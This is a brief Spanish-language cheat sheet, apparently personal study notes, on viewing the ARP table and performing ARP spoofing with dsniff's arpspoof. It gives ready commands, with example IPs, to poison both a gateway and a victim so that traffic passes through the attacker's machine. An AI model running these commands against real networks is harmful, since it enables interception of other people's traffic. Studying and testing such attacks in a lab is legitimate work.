1. Para mostrar la tabla ARP: `arp -n`
2. Para borrar la entrada con IP ip `arp -d <ip>`

## Spoofing
3. `sudo apt install dsniff`
4. `arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host`
5. `sudo arpspoof -i <interfaz> -t <target> <ip de la victima (host)>`
Target: Quien recibe el ARP falso
Host: La IP que estas suplantando

6. Envenenar la puerta de enlace (gateway) para que crea que la IP de la víctima está en tu MAC:
	`-t 192.168.1.1 192.168.1.20`

7. Envenenar la víctima para que crea que la puerta de enlace está en tu MAC
	`-t 192.168.1.20 192.168.1.1`


